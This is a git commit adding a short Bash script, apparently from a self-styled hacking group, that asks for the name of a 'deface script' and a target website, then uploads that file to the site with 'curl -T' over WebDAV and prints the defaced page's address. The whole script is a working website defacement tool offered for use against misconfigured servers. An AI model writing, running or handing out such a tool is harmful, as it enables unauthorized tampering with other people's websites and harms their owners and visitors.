b85f9cf8ca9a9f6de6516bea46f5834c42096b37
ghostxsecrxtsec <95472329+ghostxsecrxtsec@users.noreply.github.com>
2021-12-03 17:20:05 +0800

    Add files via upload

---
+++ toolswebdav.sh
@@ -0,0 +1,19 @@
+#ToolsWebdavByAdamX
+#GhostXSecrxtSecHere!!
+
+figlet -f slant GhostXSecrxtSec Tools | lolcat
+echo ""
+echo "=================================="
+echo " Github : @ad4mh3r3 "
+echo " Coded By AdamX/GhostXSecrxtSec "
+echo "=================================="
+sleep 1
+
+echo "${y}  [Masukkan Nama Script Deface]${endc} : " | lolcat
+read sc
+echo ""
+echo "${y} {1} Website Target : " | lolcat
+read web
+curl -T /sdcard/$sc $web
+echo "${y} [OUTPUT]=" $web/$sc | lolcat
+
